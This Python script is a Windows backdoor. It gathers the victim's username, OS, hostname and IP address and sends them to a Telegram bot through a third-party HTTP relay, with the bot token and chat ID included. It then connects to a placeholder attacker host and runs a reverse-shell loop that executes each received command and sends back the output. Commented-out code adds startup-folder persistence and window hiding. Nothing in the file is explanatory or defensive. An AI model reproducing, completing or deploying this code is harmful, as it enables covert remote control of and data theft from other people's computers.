import getpass, os, win32con, win32gui, datetime, platform, socket, requests, subprocess 


username = getpass.getuser()
# # startup = 'C:\\Users\\"{}"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'.format(username) 
# startup = 'C:\\Users\\"{}"\\Desktop'.format(username) 

# if os.getcwd() != startup :
#     try:
#         os.system("copy {} {}" .format(__file__,startup))
#     except:
#         print ("copy error")
#     exit()


# try:
#     pid = win32gui.GetForegroundWindow()
#     win32gui.ShowWindow(pid,win32con.SW_HIDE)
# except:
#     print ("hide error")
#     exit()


time = datetime.datetime.now()
os = platform.uname()[0] + platform.uname()[2]
pc = platform.uname()[1] + " | " + platform.uname()[4]
host = socket.gethostname()
ip = socket.gethostbyname(host)

msg = """
MPTB01 WAS EXECUTED ...
==============================
[~]  USER:  {}
[~]  OS:  {}
[~]  PC:  {}
[~]  IP:  {}
==============================
{}
""".format(username,os,pc,ip,time)

payload = {
"UrlBox" : "https://api.telegram.org/bot5933232535:AAEmiH6TfgxItHlR9MmrSmTOOh-ONPANX8E/sendMessage?text={}&chat_id=5446661281".format(msg),
"AgentList":"Mozilla Firefox",
"VersionList":"HTTP/1.1",
"MethodList":"Post"
}

while True:
    try:
        req = requests.post ("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", payload)
        print ("sent message")
        break
    except:
        print ("bot error")
        continue


while True:
    try:
        sckt = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        sckt.setsockopt (socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # sckt.connect (("192.168.86.18", 60000))
        sckt.connect (("HACKER-IP", PORT))
        break
    except:
        print ("sckt erroe")
        continue

while True:
    command = sckt.recv(1024)
    if command == b"exit" :
        sckt.close()
        break

    run = subprocess.Popen (command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = run.stdout.read() + run.stderr.read()
    sckt.send(result)
